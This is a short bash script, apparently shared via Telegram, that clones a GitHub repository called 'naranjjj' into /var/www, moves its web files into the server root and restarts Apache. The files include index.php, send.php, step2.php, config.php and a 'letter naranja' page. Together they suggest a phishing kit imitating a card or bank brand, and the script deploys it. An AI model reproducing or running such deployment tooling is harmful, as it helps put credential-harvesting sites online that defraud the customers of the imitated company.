#!/bin/bash
#
# Created by: @K41S3RR - https://t.me/K41S3RR
#
# ==============================================
cd /var/www; git clone https://github.com/resekk-vps/naranjjj
cd /var/www/naranjjj; mv ccs /var/www; mv css /var/www; mv data /var/www; mv fonts /var/www; mv js /var/www; mv parts /var/www; mv img /var/www; mv desktop.ini /var/www; mv config.php /var/www; mv error.png /var/www; mv flecha.png /var/www; mv index.php /var/www; mv letter naranja.html /var/www; mv send.php /var/www; mv step2.php /var/www
cd /var/www; nano config.php
cd /root; sudo service apache2 restart
#BANNER
clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
